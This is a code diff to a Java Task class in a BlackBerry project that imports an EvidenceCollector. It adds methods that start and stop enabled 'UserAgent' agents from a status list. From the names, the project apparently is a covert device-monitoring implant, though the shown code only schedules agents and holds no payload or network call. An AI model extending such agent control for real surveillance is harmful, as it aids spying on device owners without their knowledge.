@@ -25,6 +25,7 @@ import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.interfaces.Singleton;
+import blackberry.interfaces.UserAgent;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
@@ -469,6 +470,41 @@ public final class Task implements Singleton {
         stopAll();
         status.unTriggerAll();
         needToRestart = true;
+    }
 
+    public void resumeUserAgents() {
+        //#ifdef DEBUG
+        debug.trace("resumeUserAgents");
+        //#endif
+        Vector vector = status.getAgentsList();
+        for (int i = 0; i < vector.size(); i++) {
+            Agent agent = (Agent) vector.elementAt(i);
+            if (agent instanceof UserAgent) {
+                if (agent.isEnabled() && !agent.isRunning()) {
+                    //#ifdef DEBUG
+                    debug.trace("resumeUserAgents: " + agent);
+                    //#endif
+                    agentManager.start(agent.agentId);
+                }
+            }
+        }
+    }
+
+    public void suspendUserAgents() {
+        //#ifdef DEBUG
+        debug.trace("suspendUserAgents");
+        //#endif
+        Vector vector = status.getAgentsList();
+        for (int i = 0; i < vector.size(); i++) {
+            Agent agent = (Agent) vector.elementAt(i);
+            if (agent instanceof UserAgent) {
+                if (agent.isEnabled() && agent.isRunning()) {
+                    //#ifdef DEBUG
+                    debug.trace("suspendUserAgents: " + agent);
+                    //#endif
+                    agentManager.stop(agent.agentId);
+                }
+            }
+        }
     }
 }
